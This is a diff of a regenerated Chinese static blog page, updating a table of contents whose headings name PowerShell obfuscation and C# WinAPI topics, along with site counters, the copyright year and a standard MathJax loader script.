href="#base64%E7%BC%96%E7%A0%81powershell%E9%9A%8F%E6%9C%BA%E5%88%86%E6%AE%B5%E5%9E%83%E5%9C%BE%E6%B3%A8%E9%87%8A"><span class="nav-number">7.</span> <span class="nav-text">base64编码powershell+随机分段+垃圾注释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#c%E8%B0%83%E7%94%A8winapi"><span class="nav-number">8.</span> <span class="nav-text">C#调用WINAPI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#references"><span class="nav-number">9.</span> <span class="nav-text">References</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -683,7 +769,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -731,7 +817,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -745,7 +831,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -756,7 +842,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -896,6 +982,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
